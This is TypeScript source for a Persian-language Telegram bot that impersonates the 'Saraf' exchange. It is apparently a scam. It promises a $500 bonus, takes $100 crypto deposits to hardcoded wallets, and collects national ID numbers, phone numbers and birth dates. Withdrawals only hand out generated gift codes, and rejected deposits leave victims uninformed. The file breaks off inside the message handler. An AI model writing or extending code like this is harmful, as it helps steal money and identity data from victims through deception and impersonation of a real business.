import TelegramBot from "node-telegram-bot-api";
import {
  getOrCreateUser,
  getUser,
  getUserByReferralCode,
  updateUser,
  setUserState,
  getUserState,
  getAdminState,
  setAdminState,
  recordReferralDeposit,
  generateLicenseCode,
  generateGiftCode,
  getAllUsers,
  deleteUser,
} from "./database.js";
import { logger } from "../lib/logger.js";

const TOKEN = process.env["TELEGRAM_BOT_TOKEN"];
const ADMIN_ID = Number(process.env["ADMIN_TELEGRAM_ID"]);
const CHANNEL_LINK = process.env["CHANNEL_LINK"] ?? "https://t.me/SarafChannel";
const SUPPORT_USERNAME = process.env["SUPPORT_USERNAME"] ?? "@saraf_support";

if (!TOKEN) throw new Error("TELEGRAM_BOT_TOKEN is not set");
if (!ADMIN_ID || Number.isNaN(ADMIN_ID)) throw new Error("ADMIN_TELEGRAM_ID is not set or invalid");

const bot = new TelegramBot(TOKEN, { polling: true });

let BOT_USERNAME = "saraf_bot";
bot.getMe().then((me) => { BOT_USERNAME = me.username ?? BOT_USERNAME; }).catch(() => {});

// ─── کیف پول‌ها ───────────────────────────────────────────────────────────────
const WALLETS: Record<string, string> = {
  BTC: "bc1qc26lk80g0shsyka0nk04kh9atau5rw3j544996",
  ETH: "0x93F535b48512Ee7D5689C7Ea41a62DbE1D049C65",
  BNB: "0x93F535b48512Ee7D5689C7Ea41a62DbE1D049C65",
  TON: "UQBgNcIlv3CeRhiDL_6Tn0Gk_fMao0ipvXwtFCKvtwV_PKmw",
  TRX: "TJEY2H9qM4XwVYGd6VFqoTAhGe34VGcauR",
  "USDT-BEP20": "0x93F535b48512Ee7D5689C7Ea41a62DbE1D049C65",
  XRP: "rzLiFCKNZhLd6UZcvj5un3AUfGoSbQYoC",
};

const COIN_LABELS: Record<string, string> = {
  BTC: "بیت‌کوین (BTC) 🟠",
  ETH: "اتریوم (ETH) ⚪",
  BNB: "بایننس کوین (BNB) 🟡",
  TON: "تون کوین (TON) 🔵",
  TRX: "ترون (TRX) 🔴",
  "USDT-BEP20": "تتر BEP20 (USDT) 🟢",
  XRP: "ریپل (XRP) ⚫",
};

const COIN_FULL_NAMES: Record<string, string> = {
  BTC: "بیت‌کوین",
  ETH: "اتریوم",
  BNB: "بایننس کوین",
  TON: "تون کوین",
  TRX: "ترون",
  "USDT-BEP20": "تتر مبنی بر بایننس کوین (USDT-BEP20)",
  XRP: "ریپل",
};

const COIN_KEYS = Object.keys(WALLETS);

// ─── helpers ──────────────────────────────────────────────────────────────────
function esc(t: string): string {
  return t.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

const HTML = { parse_mode: "HTML" as const };

async function safeSend(chatId: number, text: string, opts?: object) {
  try { await bot.sendMessage(chatId, text, opts as any); }
  catch (e) { logger.error({ e, chatId }, "safeSend failed"); }
}

async function notifyAdmin(msg: string, opts?: object) {
  try { await bot.sendMessage(ADMIN_ID, msg, opts as any); }
  catch (e) { logger.error({ e }, "admin notify failed"); }
}

async function notifyAdminPhoto(fileId: string, caption: string, opts?: object) {
  try { await bot.sendPhoto(ADMIN_ID, fileId, { caption, ...(opts as any) }); }
  catch (e) { logger.error({ e }, "admin photo notify failed"); }
}

function isValidNationalId(v: string) { return /^\d{10}$/.test(v.trim()); }
function isValidPhone(v: string) { return /^(\+98|0098|0)?9\d{9}$/.test(v.trim().replace(/\s/g, "")); }
function isValidBirthDate(v: string) { return /^\d{1,2}[\/\-]\d{1,2}[\/\-]\d{2,4}$/.test(v.trim()); }

// ─── کیبوردها ─────────────────────────────────────────────────────────────────
const mainMenuKb = {
  inline_keyboard: [
    [{ text: "🎁 دریافت جایزه ۵۰۰ دلاری 🎁", callback_data: "bonus" }],
    [{ text: "💰 موجودی کیف پول 💰", callback_data: "wallet" }],
    [{ text: "واریز ➕", callback_data: "deposit" }, { text: "برداشت ➖", callback_data: "withdraw" }],
    [{ text: "👥 معرفی دوستان 🎁", callback_data: "referral" }],
    [{ text: "📢 کانال رسمی صراف 📢", callback_data: "channel" }],
    [{ text: "📘 راهنمای گام‌به‌گام ربات 📘", callback_data: "guide" }],
    [{ text: "🛎 پشتیبانی", callback_data: "support" }],
  ],
};

const backKb = {
  inline_keyboard: [[{ text: "↩️ بازگشت به منوی اصلی ↪️", callback_data: "main_menu" }]],
};

function depositCoinKb() {
  return {
    inline_keyboard: [
      ...COIN_KEYS.map(c => [{ text: `➕ ${c}`, callback_data: `dep_${c}` }]),
      [{ text: "↩️ بازگشت به منوی اصلی ↪️", callback_data: "main_menu" }],
    ],
  };
}

function withdrawCoinKb() {
  return {
    inline_keyboard: [
      ...COIN_KEYS.map(c => [{ text: `🎉 ${c}`, callback_data: `wd_coin_${c}` }]),
      [{ text: "↩️ بازگشت به منوی اصلی ↪️", callback_data: "main_menu" }],
    ],
  };
}

const adminPanelKb = {
  inline_keyboard: [
    [{ text: "👥 لیست تمام کاربران", callback_data: "admin_list_users" }],
    [{ text: "📊 آمار کلی", callback_data: "admin_stats" }],
    [{ text: "🔍 جستجوی کاربر با آیدی", callback_data: "admin_search_user" }],
    [{ text: "💳 تأیید دستی واریز کاربر", callback_data: "admin_manual_deposit" }],
    [{ text: "✉️ پاسخ به کاربر", callback_data: "admin_reply_user" }],
    [{ text: "🗑️ حذف کاربر", callback_data: "admin_delete_user_prompt" }],
    [{ text: "📢 ارسال پیام همگانی", callback_data: "admin_broadcast_prompt" }],
  ],
};

const adminBackKb = {
  inline_keyboard: [[{ text: "🔙 بازگشت به پنل ادمین", callback_data: "admin_back_panel" }]],
};

// ─── منوی اصلی ────────────────────────────────────────────────────────────────
async function sendMainMenu(chatId: number, userId: number) {
  setUserState(userId, "idle");
  await safeSend(chatId,
    `👋 درود و خوش‌آمدید به ربات تلگرامی «صراف»!

این ربات، دستیار رسمی اپلیکیشن صراف — بزرگ‌ترین و معتبرترین پلتفرم خرید و فروش طلا، دلار و ارز دیجیتال در ایران — می‌باشد.

📆 همراهی قابل اعتماد از اردیبهشت ۱۳۹۸
💎 صراف: خرید آسان، سریع و امن با اطمینان خاطر

✅ احراز هویت آنی (زیر ۲ دقیقه)
✅ واریز و برداشت لحظه‌ای با بالاترین سطح امنیت
✅ شروع سرمایه‌گذاری حتی با ۵۰ هزار تومان

🌐 وب‌سایت رسمی:
https://Saraf.App

📄 مجوزها و هویت قانونی:
https://saraf.app/about-saraf

🎁 ویژگی منحصربه‌فرد این ربات:
دریافت جایزه ویژه ۵۰۰ دلاری 🎊
به منظور حمایت از کاربران و ارتقای سرمایه‌گذاری، این فرصت یک‌بار به هر کد ملی تعلق می‌گیرد.

ما همواره متعهد به موفقیت و امنیت سرمایه شما هستیم. 🛡️`,
    { reply_markup: mainMenuKb });
}

// ─── /start ───────────────────────────────────────────────────────────────────
bot.onText(/\/start(?:\s+(.+))?/, async (msg, match) => {
  try {
    const userId = msg.from!.id;
    const chatId = msg.chat.id;
    const param = match?.[1]?.trim() ?? "";

    let referredBy: number | undefined;
    if (param.startsWith("ref_")) {
      const referrer = getUserByReferralCode(param.slice(4));
      if (referrer && referrer.userId !== userId) referredBy = referrer.userId;
    }

    const isNew = !getUser(userId);
    getOrCreateUser(userId, msg.from?.username, msg.from?.first_name, referredBy);

    if (isNew && referredBy) {
      const referrer = getUser(referredBy);
      try {
        await bot.sendMessage(referredBy,
          `🎉 یک نفر با لینک معرفی شما به ربات صراف پیوست!\n\n👤 کاربر جدید: ${msg.from?.first_name ?? "-"}\n\n✅ اگر این کاربر واریز موفق انجام دهد، در آمار ارجاع شما ثبت خواهد شد.\n\n👥 مجموع معرفی‌های شما: ${(referrer?.referrals?.length ?? 0)} نفر`);
      } catch { }
    }

    await sendMainMenu(chatId, userId);
  } catch (e) { logger.error({ e }, "/start error"); }
});

// ─── /admin ───────────────────────────────────────────────────────────────────
bot.onText(/\/admin/, async (msg) => {
  try {
    if (msg.from!.id !== ADMIN_ID) {
      await safeSend(msg.chat.id, "♦️ خارج از محدوده مشخص شده ♦️");
      return;
    }
    getOrCreateUser(ADMIN_ID, msg.from!.username, msg.from!.first_name);
    await safeSend(msg.chat.id, "🛡️ پنل مدیریت ربات صراف\n\nلطفاً یک بخش را انتخاب کنید:", { reply_markup: adminPanelKb });
  } catch (e) { logger.error({ e }, "/admin error"); }
});

// ─── callback_query ───────────────────────────────────────────────────────────
bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message?.chat.id;
    if (!chatId) return;
    const userId = query.from.id;
    const data = query.data ?? "";
    try { await bot.answerCallbackQuery(query.id); } catch { }

    const user = getOrCreateUser(userId, query.from.username, query.from.first_name);

    // ── FIX: اگر ادمین روی هر دکمه‌ای کلیک کند، adminState پاک می‌شود ──────
    // (مگر اینکه همین کلیک برای set کردن adminState باشد)
    if (userId === ADMIN_ID && getAdminState(ADMIN_ID)) {
      const nonResetCallbacks = [
        "admin_search_user", "admin_manual_deposit", "admin_reply_user",
        "admin_delete_user_prompt", "admin_broadcast_prompt",
      ];
      if (!nonResetCallbacks.includes(data)) {
        setAdminState(ADMIN_ID, undefined);
      }
    }

    // ── منوی اصلی ────────────────────────────────────────────────────────────
    if (data === "main_menu") {
      await sendMainMenu(chatId, userId);
      return;
    }

    // ════ بخش کاربر ═══════════════════════════════════════════════════════════

    // ── پشتیبانی ─────────────────────────────────────────────────────────────
    if (data === "support") {
      // FIX: state را روی support_chat می‌گذاریم تا پیام‌های بعدی به ادمین برسد
      setUserState(userId, "support_chat");
      await safeSend(chatId,
        `🛎 بخش پشتیبانی صراف

کاربر گرامی، پیام خود را همین‌جا تایپ کرده و ارسال کنید.
تیم پشتیبانی ما در اسرع وقت پاسخ خواهد داد.

💬 پشتیبانی آنلاین: ${SUPPORT_USERNAME}
🌐 وب‌سایت: https://Saraf.App

⏱ ساعات پاسخگویی: شنبه تا پنج‌شنبه — ۹ صبح تا ۹ شب

ما همواره در کنار شما هستیم. 🤝`,
        { reply_markup: backKb });
      return;
    }

    // ── جایزه ────────────────────────────────────────────────────────────────
    if (data === "bonus") {
      setUserState(userId, "idle");
      if (user.bonusActivated) {
        await safeSend(chatId,
          `✅ جایزه ۵۰۰ دلاری شما قبلاً فعال شده است.\n\n💰 برای برداشت موجودی، به بخش «برداشت ➖» مراجعه نمایید.`,
          { reply_markup: backKb });
        return;
      }
      await safeSend(chatId,
        `🔸 کاربر گرامی، سلام و احترام

در این بخش، با تکمیل فرآیند احراز هویت، می‌توانید جایزه ویژه ۵۰۰ دلاری خود را دریافت نمایید.

🛡️ مراحل احراز هویت:
۱. وارد کردن کد ملی
۲. وارد کردن شماره تلفن همراه
۳. وارد کردن تاریخ تولد

🎊 مرحله نهایی دریافت جایزه:
🔐 وارد کردن کد لایسنس شخصی

⚠️ توجه مهم:
اطلاعات ارسالی باید دقیق، کامل و متعلق به یک شخص باشد. در صورت عدم تطابق یا خطا، فرآیند برداشت تأیید نخواهد شد.
با آرزوی موفقیت و سودآوری. 🏆`,
        {
          reply_markup: {
            inline_keyboard: [
              [{ text: "↩️ بازگشت به منوی اصلی ↪️", callback_data: "main_menu" }],
              [{ text: "🎁 ادامه فرایند دریافت جایزه 🎁", callback_data: "bonus_start" }],
            ],
          },
        });
      return;
    }

    if (data === "bonus_start") {
      const fresh = getUser(userId)!;
      if (fresh.bonusActivated) {
        await safeSend(chatId,
          `✅ جایزه شما قبلاً فعال شده است.\n\n💰 برای برداشت به بخش «برداشت ➖» مراجعه کنید.`,
          { reply_markup: backKb });
        return;
      }
      if (!fresh.deposited) {
        await safeSend(chatId,
          `⚠️ برای فعال‌سازی جایزه، ابتدا باید از بخش «واریز ➕» حداقل ۱۰۰ دلار واریز نموده و کد لایسنس دریافت نمایید.`,
          { reply_markup: backKb });
        return;
      }
      setUserState(userId, "kyc_step1");
      await safeSend(chatId,
        `🛡️ بخش احراز هویت | مرحله اول\n\nبرای دریافت جایزه ۵۰۰ دلاری، لطفاً کد ملی خود را وارد نمایید:`);
      return;
    }

    // ── کیف پول ──────────────────────────────────────────────────────────────
    if (data === "wallet") {
      setUserState(userId, "idle");
      const u = getUser(userId)!;
      if (u.withdrawalCompleted) {
        await safeSend(chatId,
          `👤 نام شما: ${u.firstName ?? "-"}\n💼 موجودی فعلی: ۰ USDT\n📅 تاریخ عضویت: ${u.registeredAt}\n🔐 کد لایسنس: ${u.licenseCode ?? "-"}\n\n✅ برداشت شما با موفقیت انجام شده است.\nموجودی کیف پول شما صفر شده است.`,
          { reply_markup: backKb });
      } else if (u.bonusActivated) {
        await safeSend(chatId,
          `👤 نام شما: ${u.firstName ?? "-"}\n💼 موجودی فعلی: ۶۰۰ USDT (جایزه فعال 🟢)\n📅 تاریخ عضویت: ${u.registeredAt}\n🔐 کد لایسنس شخصی: <code>${esc(u.licenseCode ?? "-")}</code>\n\n🎊 تبریک!\nجایزه ۵۰۰ دلاری به همراه واریز شما با موفقیت فعال گردید و قابل برداشت است.\n\n💰 امکان برداشت سریع و بدون محدودیت فراهم است.\n(پس از برداشت، موجودی حساب صفر خواهد شد.)`,
          { ...HTML, reply_markup: backKb });
      } else if (u.deposited) {
        await safeSend(chatId,
          `👤 نام شما: ${u.firstName ?? "-"}\n💼 موجودی فعلی: ۵۰۰ USDT (جایزه آماده فعال‌سازی 🟡)\n📅 تاریخ عضویت: ${u.registeredAt}\n🔐 کد لایسنس شخصی: <code>${esc(u.licenseCode ?? "-")}</code>\n\n📌 واریز شما تأیید شده و کد لایسنس دریافت کردید.\nبرای فعال‌سازی جایزه ۵۰۰ دلاری:\n۱. به بخش «🎁 دریافت جایزه» بروید.\n۲. احراز هویت را تکمیل کنید.\n۳. کد لایسنس خود را وارد کنید.\n۴. موجودی به ۶۰۰ USDT افزایش می‌یابد.`,
          { ...HTML, reply_markup: backKb });
      } else {
        await safeSend(chatId,
          `👤 نام شما: ${u.firstName ?? "-"}\n💼 موجودی فعلی: ۵۰۰ USDT (جایزه غیرفعال ⛔)\n📅 تاریخ عضویت: ${u.registeredAt}\n🔐 کد لایسنس شخصی: پس از فعال‌سازی جایزه قابل مشاهده خواهد بود.\n\n⚠️ راهنمای فعال‌سازی:\nبرای فعال‌سازی قابلیت برداشت و مشاهده کد لایسنس، لطفاً حداقل مبلغ ۱۰۰ دلار به حساب خود واریز نمایید. پس از واریز:\n۱. کد لایسنس شخصی خود را در بخش «🎁 دریافت جایزه» وارد کنید.\n۲. موجودی شما به ۶۰۰ USDT افزایش خواهد یافت.\n۳. جایزه ۵۰۰ دلاری فعال می‌شود.\n۴. امکان برداشت تمام موجودی بدون هیچ محدودیتی فراهم می‌گردد.`,
          { reply_markup: backKb });
      }
      return;
    }

    // ── سیستم معرفی ──────────────────────────────────────────────────────────
    if (data === "referral") {
      setUserState(userId, "idle");
      const u = getUser(userId)!;
      const refCode = u.referralCode ?? String(userId);
      const refLink = `https://t.me/${BOT_USERNAME}?start=ref_${refCode}`;
      const totalRefs = u.referrals?.length ?? 0;
      const depositedRefs = u.referralDeposits ?? 0;
      await safeSend(chatId,
        `👥 سیستم معرفی دوستان صراف\n\n🔗 لینک اختصاصی معرفی شما:\n<code>${esc(refLink)}</code>\n\n📊 آمار معرفی‌های شما:\n👤 تعداد دعوت‌شدگان: ${totalRefs} نفر\n💳 واریز موفق دعوت‌شدگان: ${depositedRefs} نفر\n💰 پاداش معرفی: ${depositedRefs} × ۲۵٪ از مبلغ واریز\n\n💡 نحوه کار:\n۱. لینک اختصاصی خود را با دوستانتان به اشتراک بگذارید.\n۲. وقتی دوست شما از طریق لینک وارد شود، عضویت او در نام شما ثبت می‌گردد.\n۳. پس از واریز موفق توسط دوست شما، ۲۵٪ پاداش به حساب صراف شما اضافه می‌شود.\n\n📣 لینک خود را همین الان کپی کنید و به اشتراک بگذارید!`,
        {
          ...HTML,
          reply_markup: {
            inline_keyboard: [
              [{ text: "📤 اشتراک‌گذاری لینک معرفی", switch_inline_query: `🎁 با لینک من به صراف بپیوند و جایزه ۵۰۰ دلاری بگیر!\n${refLink}` }],
              [{ text: "↩️ بازگشت به منوی اصلی ↪️", callback_data: "main_menu" }],
            ],
          },
        });
      return;
    }

    // ── واریز ────────────────────────────────────────────────────────────────
    if (data === "deposit") {
      setUserState(userId, "idle");
      await safeSend(chatId,
        `🔄 انتخاب روش واریز\n\nلطفاً روش مورد نظر خود را انتخاب نمایید:\n\n🔒 تمامی تراکنش‌ها در محیطی امن و رمزگذاری‌شده انجام می‌شوند.\n\n⚠️ در صورت بروز هرگونه ابهام یا مشکل، با پشتیبانی رسمی سایت تماس حاصل فرمایید.`,
        {
          reply_markup: {
            inline_keyboard: [
              [{ text: "💱 واریز با ارز دیجیتال 🟢", callback_data: "deposit_crypto" }],
              [{ text: "↩️ بازگشت به منوی اصلی ↪️", callback_data: "main_menu" }],
            ],
          },
        });
      return;
    }

    if (data === "deposit_crypto") {
      setUserState(userId, "idle");
      await safeSend(chatId, `🪙 انتخاب ارز دیجیتال برای واریز\n\nلطفاً ارز مورد نظر خود را انتخاب کنید:`, { reply_markup: depositCoinKb() });
      return;
    }

    for (const coin of COIN_KEYS) {
      if (data === `dep_${coin}`) {
        setUserState(userId, `deposit_receipt_${coin}`);
        await safeSend(chatId,
          `💎 واریز با ${COIN_FULL_NAMES[coin] ?? coin}\n\nلطفاً معادل ۱۰۰ دلار ${COIN_FULL_NAMES[coin] ?? coin} به آدرس زیر واریز نمایید:\n\n📍 آدرس ولت:\n<code>${esc(WALLETS[coin]!)}</code>\n\n⚠️ توجه ضروری:\nپس از واریز، لطفاً تصویر رسید تراکنش به همراه هش (شناسه) تراکنش را در همین قسمت ارسال نمایید.\n\n🔴 هشدار:\nواریز کمتر از میزان تعیین‌شده ممکن است توسط سیستم تأیید نگردد و منجر به از دست رفتن دارایی شما شود. واریز مبلغ بیشتر، مزیت اضافه‌ای ایجاد نمی‌کند.`,
          HTML);
        return;
      }
    }

    // ── برداشت ───────────────────────────────────────────────────────────────
    if (data === "withdraw") {
      const u = getUser(userId)!;
      if (!u.bonusActivated) {
        await safeSend(chatId,
          `⚠️ برای برداشت، ابتدا باید جایزه را از بخش «🎁 دریافت جایزه» فعال نمایید.`,
          { reply_markup: backKb });
        return;
      }
      if (u.withdrawalCompleted) {
        await safeSend(chatId, `⚠️ برداشت شما قبلاً انجام شده است.`, { reply_markup: backKb });
        return;
      }
      setUserState(userId, "withdraw_license_entry");
      await safeSend(chatId,
        `🔐 ورود کد لایسنس برای برداشت\n\nلطفاً کد لایسنس شخصی خود را جهت شروع فرآیند برداشت وارد نمایید.\n\n📌 راهنمایی: این همان کد لایسنسی است که پس از واریز در اختیار شما قرار گرفت.`);
      return;
    }

    // ── برداشت کد هدیه ───────────────────────────────────────────────────────
    if (data === "wd_gift_menu") {
      setUserState(userId, "idle");
      await safeSend(chatId,
        `💎 تأیید مبلغ برداشت\n\n🔷 لطفاً با فشردن دکمه زیر، مبلغ ۶۰۰ دلار را برای برداشت تأیید نمایید.`,
        {
          reply_markup: {
            inline_keyboard: [
              [{ text: "↩️ بازگشت به منوی اصلی ↪️", callback_data: "main_menu" }],
              [{ text: "🎉 تأیید برداشت ۶۰۰ دلار 🎉", callback_data: "wd_gift_confirm" }],
            ],
          },
        });
      return;
    }

    if (data === "wd_gift_confirm") {
      await safeSend(chatId,
        `⚠️ آیا از تصمیم خود برای برداشت مطمئن هستید؟\n\nلطفاً با دقت تأیید نمایید.`,
        {
          reply_markup: {
            inline_keyboard: [
              [{ text: "❌ انصراف از برداشت ❌", callback_data: "main_menu" }],
              [{ text: "✅ تأیید و ادامه فرآیند برداشت ✅", callback_data: "wd_gift_final" }],
            ],
          },
        });
      return;
    }

    if (data === "wd_gift_final") {
      setUserState(userId, "idle");
      const u = getUser(userId)!;
      if (!u.bonusActivated || u.withdrawalCompleted) {
        await safeSend(chatId,
          `⚠️ امکان برداشت وجود ندارد.\n\nموجودی کیف پول شما برای انجام این تراکنش کافی نمی‌باشد.`,
          { reply_markup: backKb });
        return;
      }
      const giftCode = generateGiftCode();
      updateUser(userId, { withdrawalCompleted: true });
      await safeSend(chatId,
        `🎊 تراکنش برداشت با موفقیت تکمیل شد.\n\n💰 مبلغ کد هدیه: ۶۰۰ دلار\n🎁 کد هدیه شما: <code>${esc(giftCode)}</code>\n\n🟢 تاریخ فعال‌سازی: هم‌اکنون\n🔴 تاریخ انقضا: ۴ ماه پس از دریافت\n\n🌐 روش استفاده:\n۱. به وب‌سایت https://Saraf.App مراجعه نمایید.\n۲. به بخش «🎁 دریافت هدیه» وارد شوید.\n۳. کد هدیه خود را وارد کنید.\n۴. معادل ریالی مبلغ به حساب شما افزوده خواهد شد.\n\n💡 امکان تبدیل به ریال یا سرمایه‌گذاری روی ارزهای دیجیتال فراهم است.`,
        { ...HTML, reply_markup: backKb });
      return;
    }

    // ── برداشت ارز دیجیتال ───────────────────────────────────────────────────
    if (data === "wd_crypto_menu") {
      setUserState(userId, "idle");
      await safeSend(chatId,
        `💎 تأیید مبلغ برداشت\n\n🎁 لطفاً با فشردن دکمه زیر، مبلغ ۶۰۰ دلار را برای برداشت تأیید نمایید.`,
        {
          reply_markup: {
            inline_keyboard: [
              [{ text: "↩️ بازگشت به منوی اصلی ↪️", callback_data: "main_menu" }],
              [{ text: "⚜️ تأیید برداشت ۶۰۰ دلار ⚜️", callback_data: "wd_crypto_confirm" }],
            ],
          },
        });
      return;
    }

    if (data === "wd_crypto_confirm") {
      await safeSend(chatId,
        `⚠️ آیا از تصمیم خود برای برداشت مطمئن هستید؟\n\nلطفاً با دقت تأیید نمایید.`,
        {
          reply_markup: {
            inline_keyboard: [
              [{ text: "♦️ انصراف از برداشت ♦️", callback_data: "main_menu" }],
              [{ text: "✳️ تأیید و ادامه فرآیند برداشت ✳️", callback_data: "wd_crypto_coin_select" }],
            ],
          },
        });
      return;
    }

    if (data === "wd_crypto_coin_select") {
      const u = getUser(userId)!;
      if (!u.bonusActivated || u.withdrawalCompleted) {
        await safeSend(chatId,
          `⚠️ امکان برداشت وجود ندارد.\n\nموجودی کیف پول 📤 شما برای انجام این تراکنش کافی نمی‌باشد.`,
          { reply_markup: backKb });
        return;
      }
      await safeSend(chatId,
        `✅ مبلغ برداشت تأیید شد.\n\n🎉 لطفاً ارز مورد نظر خود را برای برداشت انتخاب کنید:`,
        { reply_markup: withdrawCoinKb() });
      return;
    }

    for (const coin of COIN_KEYS) {
      if (data === `wd_coin_${coin}`) {
        setUserState(userId, `withdraw_address_${coin}`);
        await safeSend(chatId,
          `📍 دریافت آدرس کیف پول\n\nلطفاً آدرس ارز دیجیتال ${COIN_LABELS[coin] ?? coin} خود را برای واریز مبلغ برداشت وارد نمایید.`);
        return;
      }
    }

    // ── کانال ────────────────────────────────────────────────────────────────
    if (data === "channel") {
      setUserState(userId, "idle");
      await safeSend(chatId,
        `🌟 به خانواده بزرگ صراف خوش آمدید.\n\nبرای دریافت آخرین اخبار، اطلاعیه‌ها و پیشنهادات ویژه، به کانال رسمی ما بپیوندید.`,
        {
          reply_markup: {
            inline_keyboard: [
              [{ text: "🎁 عضویت در کانال رسمی 🎁", url: CHANNEL_LINK }],
              [{ text: "↩️ بازگشت به منوی اصلی ↪️", callback_data: "main_menu" }],
            ],
          },
        });
      return;
    }

    // ── راهنما ───────────────────────────────────────────────────────────────
    if (data === "guide") {
      setUserState(userId, "idle");
      await safeSend(chatId,
        `🌟 راهنمای جامع استفاده از ربات صراف

مرحله اول:
💳 واریز اولیه
برای فعال‌سازی جایزه و دریافت کد لایسنس، لطفاً از بخش «واریز»، حداقل ۱۰۰ دلار به حساب خود واریز نمایید. این مرحله جهت احراز هویت و اطمینان از واقعی بودن کاربر ضروری است.

مرحله دوم:
🎁 فعال‌سازی جایزه
به بخش «دریافت جایزه» مراجعه کرده و با تکمیل احراز هویت و وارد کردن کد لایسنس، جایزه ۵۰۰ دلاری خود را فعال نمایید.

مرحله سوم:
💰 برداشت موجودی
با مراجعه به بخش «برداشت» و وارد کردن کد لایسنس، روش برداشت مورد نظر خود را انتخاب کرده و موجودی خود را دریافت نمایید.

⚠️ توجه:
دقت نمایید اطلاعات ارائه‌شده در مرحله احراز هویت، دقیق و صحیح باشد تا در فرآیند برداشت با مشکل مواجه نشوید.

💎 موفق و سودآور باشید.`,
        { reply_markup: backKb });
      return;
    }

    // ════ بخش ادمین ═══════════════════════════════════════════════════════════
    if (userId !== ADMIN_ID) return;

    if (data === "admin_back_panel") {
      await safeSend(chatId, "🛡️ پنل مدیریت صراف:", { reply_markup: adminPanelKb });
      return;
    }

    if (data === "admin_stats") {
      const users = getAllUsers();
      await safeSend(chatId,
        `📊 آمار کلی\n\n👥 کل کاربران: ${users.length}\n💳 واریز کرده: ${users.filter(u => u.deposited).length}\n🎁 جایزه فعال: ${users.filter(u => u.bonusActivated).length}\n✅ برداشت کرده: ${users.filter(u => u.withdrawalCompleted).length}\n🔗 کل معرفی‌ها: ${users.reduce((s, u) => s + (u.referrals?.length ?? 0), 0)}`,
        { reply_markup: adminBackKb });
      return;
    }

    if (data === "admin_list_users") {
      const users = getAllUsers();
      if (!users.length) {
        await safeSend(chatId, "👥 هیچ کاربری ثبت‌نام نکرده.", { reply_markup: adminBackKb });
        return;
      }
      for (let i = 0; i < users.length; i += 8) {
        const slice = users.slice(i, i + 8);
        let text = `👥 کاربران ${i + 1}–${Math.min(i + 8, users.length)} از ${users.length}\n\n`;
        for (const u of slice) {
          text += `${u.withdrawalCompleted ? "✅" : u.deposited ? "💳" : "⏳"} آیدی: ${u.userId} | @${u.username ?? "-"}\n`;
          text += `   واریز:${u.deposited ? "✅" : "❌"} جایزه:${u.bonusActivated ? "✅" : "❌"} برداشت:${u.withdrawalCompleted ? "✅" : "❌"} معرفی:${u.referrals?.length ?? 0}\n\n`;
        }
        await safeSend(chatId, text, { reply_markup: i + 8 >= users.length ? adminBackKb : undefined });
      }
      return;
    }

    if (data === "admin_search_user") {
      setAdminState(ADMIN_ID, "search_user");
      await safeSend(chatId, "🔍 آیدی عددی کاربر را ارسال کنید:");
      return;
    }

    if (data === "admin_manual_deposit") {
      setAdminState(ADMIN_ID, "manual_deposit");
      await safeSend(chatId, "💳 آیدی کاربری که واریزش تأیید می‌شود را ارسال کنید:");
      return;
    }

    // FIX: ادمین می‌تواند به کاربر مشخص پاسخ دهد
    if (data === "admin_reply_user") {
      setAdminState(ADMIN_ID, "reply_user_id");
      await safeSend(chatId, "✉️ آیدی عددی کاربری که می‌خواهید پاسخ دهید را ارسال کنید:");
      return;
    }

    if (data === "admin_delete_user_prompt") {
      setAdminState(ADMIN_ID, "delete_user");
      await safeSend(chatId, "🗑️ آیدی کاربری که باید حذف شود را ارسال کنید:");
      return;
    }

    if (data === "admin_broadcast_prompt") {
      setAdminState(ADMIN_ID, "broadcast");
      await safeSend(chatId, "📢 متن پیام همگانی را بنویسید:");
      return;
    }

    if (data.startsWith("admin_confirm_delete_")) {
      const tid = Number(data.replace("admin_confirm_delete_", ""));
      deleteUser(tid);
      await safeSend(chatId, `🗑️ کاربر ${tid} با موفقیت حذف شد.`, { reply_markup: adminBackKb });
      return;
    }

    if (data.startsWith("admin_approve_deposit_")) {
      const tid = Number(data.replace("admin_approve_deposit_", ""));
      const tu = getUser(tid);
      if (!tu) { await safeSend(chatId, "❌ کاربر یافت نشد."); return; }
      if (tu.deposited) {
        await safeSend(chatId,
          `⚠️ واریز این کاربر قبلاً تأیید شده.\n🔐 کد لایسنس: <code>${esc(tu.licenseCode ?? "-")}</code>`,
          HTML);
        return;
      }
      const code = generateLicenseCode();
      updateUser(tid, { deposited: true, licenseCode: code });
      if (tu.referredBy) {
        recordReferralDeposit(tu.referredBy);
        try {
          const ref = getUser(tu.referredBy);
          await bot.sendMessage(tu.referredBy,
            `🎉 تبریک! دوست شما «${tu.firstName ?? tu.username ?? tu.userId}» واریز موفق انجام داد!\n\n💰 ۲۵٪ از مبلغ واریز ایشان به عنوان پاداش به حساب صراف شما اضافه خواهد شد.\n\n📊 واریزهای موفق معرفی‌شدگان شما: ${ref?.referralDeposits ?? 1} نفر`);
        } catch { }
      }
      await safeSend(tid,
        `✅ تبریک! واریز شما با موفقیت تأیید شد.\n\n🎁 کد لایسنس شخصی شما:\n<code>${esc(code)}</code>\n\n📌 نکات مهم:\nبا این کد لایسنس می‌توانید جایزه ۵۰۰ دلاری خود را فعال نموده و در بخش برداشت نیز از آن استفاده نمایید.`,
        { ...HTML, reply_markup: backKb });
      await safeSend(chatId, `✅ واریز کاربر ${tid} تأیید شد.\n🔐 کد لایسنس: <code>${esc(code)}</code>`, { ...HTML, reply_markup: adminBackKb });
      return;
    }

    if (data.startsWith("admin_reject_deposit_")) {
      // رد واریز: برای کاربر پیامی ارسال نمی‌شود
      await safeSend(chatId, "♦️ تراکنش رد شد.", { reply_markup: adminBackKb });
      return;
    }

    if (data.startsWith("admin_approve_withdraw_")) {
      const parts = data.replace("admin_approve_withdraw_", "").split("_COIN_");
      const tid = Number(parts[0]!);
      const coin = parts[1] ?? "";
      updateUser(tid, { withdrawalCompleted: true });
      await safeSend(tid,
        `🎉 تبریک! برداشت شما با موفقیت انجام شد.\n\n💰 مبلغ: ۶۰۰ دلار\n🪙 ارز: ${COIN_LABELS[coin] ?? coin}\n\nمبلغ به زودی به آدرس کیف پول شما واریز می‌گردد.`,
        { reply_markup: backKb });
      await safeSend(chatId, `✅ برداشت کاربر ${tid} (${coin}) تأیید شد.`, { reply_markup: adminBackKb });
      return;
    }

  } catch (e) { logger.error({ e }, "callback_query error"); }
});

// ─── message handler ──────────────────────────────────────────────────────────
bot.on("message", async (msg) => {
  try {
    if (!msg.from || msg.text?.startsWith("/")) return;
    const userId = msg.from.id;
    const chatId = msg.chat.id;
    const user = getOrCreateUser(userId, msg.from.username, msg.from.first_name);
    const state = getUserState(userId);
